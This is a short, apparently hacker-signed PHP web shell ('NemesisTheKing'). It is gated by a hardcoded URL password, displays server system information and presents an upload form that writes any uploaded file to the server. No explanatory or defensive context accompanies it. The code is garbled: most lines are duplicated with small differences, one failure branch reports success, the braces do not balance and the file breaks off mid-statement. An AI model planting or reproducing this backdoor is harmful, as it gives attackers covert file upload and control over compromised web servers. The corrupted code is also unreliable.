<?php 
error_reporting(E_ERROR | E_PARSE);
error_reporting(E_ERROR | E_PARSE);
if ($_GET["pass"] == "nyxfallagatn"){
if ($_GET["pass"] == "nyxfallagatn"){
echo "NemesisTheKing";
echo "<b>NemesisTheKing</b><br>";
echo '<b>System Info:</b> '.php_uname();
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
echo '<b>Uploaded Successfully!</b><br><br>'; 
echo '<b>Success!</b><br><br>'; 
}else { echo 'Uploaded Successfully!</b><br><br>'; }}
}else { echo 'Failed!</b><br><br>'; }}
}else{
}else{
$domain = $_SERVER['SERVER_NAME'];
$domain = $_SERVER['SERVER_NAME'];
echo'<html><head>
echo'<html><head>
